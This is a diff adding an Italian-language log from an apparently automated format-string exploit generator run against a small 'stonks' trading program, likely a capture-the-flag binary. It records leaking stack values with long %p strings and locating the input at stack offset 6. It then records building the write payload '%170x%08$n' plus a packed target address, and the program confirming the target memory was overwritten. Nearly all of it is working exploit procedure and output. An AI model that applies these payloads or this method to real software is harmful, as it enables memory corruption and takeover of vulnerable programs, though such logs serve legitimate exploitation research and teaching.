@@ -1,0 +1,60 @@
+Byte da scrivere: 4
+Dimensione indirizzi: 8 byte
+Endian: little
+
+Input da linea di comando: []
+Input da passare durante l'esecuzione: [{'type': 'execution_input', 'marker': '2) view my portfolio\n', 'value': '1', 'free': False}, {'type': 'execution_input', 'marker': 'what is your api token?\n', 'value': 'PPPP', 'free': True}]
+Preparazione indirizzi e scrittori: 
+   Sottovalori da scrivere: | 170 | 
+   Relative dimensioni di scrittura: [4]
+   Relativi nuovi indirizzi target: | 0x60104c | 
+   Scrittori: [['%170x', None, 'n']]
+
+
+Inizio ricerca di input vulnerabili
+
+Input in test: {'type': 'execution_input', 'marker': '2) view my portfolio\n', 'value': '1', 'free': False}
+Input non libero
+
+Input in test: {'type': 'execution_input', 'marker': 'what is your api token?\n', 'value': 'PPPP', 'free': True}
+Input libero, verifica se exploitabile: input exploitabile
+Verifica stampa della dimensione minima della stringa di exploit (14 caratteri): dimensione minima stampata
+Definizione marcati per estrarre fmt nella risposta: jj, lp
+Conteggio della dimensione effettiva dell'input (fino a 518 caratteri): 296 caratteri disponibili + 4 caratteri usati dai marcatori
+Ricerca fmt su stack: 
+   Stringa di ricerca: jjAAAAAAAA%1$p%2$p%3$p%4$p%5$p%6$p%7$p%8$p%9$p%10$p%11$p%12$p%13$p%14$p%15$p%16$p%17$p%18$p%19$p%20$p%21$p%22$p%23$p%24$p%25$p%26$p%27$p%28$p%29$p%30$p%31$p%32$p%33$p%34$p%35$p%36$p%37$p%38$p%39$p%40$p%41$p%42$p%43$p%44$p%45$p%46$p%47$p%48$p%49$p%50$p%51$p%52$p%53$p%54$p%55$p%56$p%57$p%58$p%59$pGGlp
+   Valori esadecimali estratti: ['602260', '7ffff7dcf8c0', '7ffff7af2104', '7ffff7fe14c0', '0', '4141414141416a6a', '3225702431254141', '3425702433257024', '3625702435257024', '3825702437257024', '3125702439257024', '7024313125702430', '3331257024323125', '2570243431257024', '2436312570243531', '3125702437312570', '7024393125702438', '3132257024303225', '2570243232257024', '2434322570243332', '3225702435322570', '7024373225702436', '3932257024383225', '2570243033257024', '2432332570243133', '3325702433332570', '7024353325702434', '3733257024363325', '2570243833257024', '2430342570243933', '3425702431342570', '7024333425702432', '3534257024343425', '2570243634257024', '2438342570243734', '3525702439342570', '7024313525702430', '3335257024323525', '2570243435257024', '2436352570243535', '3525702437352570', '7024393525702438', '7f00706c4747', '7fffffffdd30', '4006a5', '7fffffffde18', '100400500', '7fffffffde10', '100000000', '400700', '7ffff7a03c87', '1', '7fffffffde18', '100008000', '40063c', '0', 'af27196448588cbb', '400500', '7fffffffde10']
+    Valore 1 -> 602260
+    Valore 2 -> 7ffff7dcf8c0
+    Valore 3 -> 7ffff7af2104
+    Valore 4 -> 7ffff7fe14c0
+    Valore 5 -> 0
+    Valore 6 -> 4141414141416a6a
+    Valore 7 -> 3225702431254141
+
+   Verifica posizione:
+   Stringa di conferma: jjBBBBBBBB%1$p%2$p%3$p%4$p%5$p%6$p%7$p%8$p%9$p%10$p%11$p%12$p%13$p%14$p%15$p%16$p%17$p%18$p%19$p%20$p%21$p%22$p%23$p%24$p%25$p%26$p%27$p%28$p%29$p%30$p%31$p%32$p%33$p%34$p%35$p%36$p%37$p%38$p%39$p%40$p%41$p%42$p%43$p%44$p%45$p%46$p%47$p%48$p%49$p%50$p%51$p%52$p%53$p%54$p%55$p%56$p%57$p%58$p%59$pGGlp
+   Valori esadecimali estratti: ['602260', '7ffff7dcf8c0', '7ffff7af2104', '7ffff7fe14c0', '0', '4242424242426a6a', '3225702431254242', '3425702433257024', '3625702435257024', '3825702437257024', '3125702439257024', '7024313125702430', '3331257024323125', '2570243431257024', '2436312570243531', '3125702437312570', '7024393125702438', '3132257024303225', '2570243232257024', '2434322570243332', '3225702435322570', '7024373225702436', '3932257024383225', '2570243033257024', '2432332570243133', '3325702433332570', '7024353325702434', '3733257024363325', '2570243833257024', '2430342570243933', '3425702431342570', '7024333425702432', '3534257024343425', '2570243634257024', '2438342570243734', '3525702439342570', '7024313525702430', '3335257024323525', '2570243435257024', '2436352570243535', '3525702437352570', '7024393525702438', '7f00706c4747', '7fffffffdd30', '4006a5', '7fffffffde18', '100400500', '7fffffffde10', '100000000', '400700', '7ffff7a03c87', '1', '7fffffffde18', '100008000', '40063c', '0', '4689e402412f056c', '400500', '7fffffffde10']
+    Valore 6 -> 4242424242426a6a
+    Valore 7 -> 3225702431254242
+   Posizione 6
+Generazione fmt per exploit nel formato 'scrittori-indirizzi': 
+   Scrittori: [['%170x', '%08$', 'n']]
+   Padding di allineamento: '......'
+   Generazione completata con successo
+La stringa generata è: 
+		b'%170x%08$n......L\x10`\x00\x00\x00\x00\x00'
+Inizio exploit: La risposta è:
+----------------------------------------
+welcome back to the trading app!
+
+what would you like to do?
+1) buy some stonks!
+2) view my portfolio
+what is your api token?
+buying stonks with token:
+                                                                                                                                                                    602260......L`!!!!
+Target modified correctly!
+goodbye!
+
+----------------------------------------
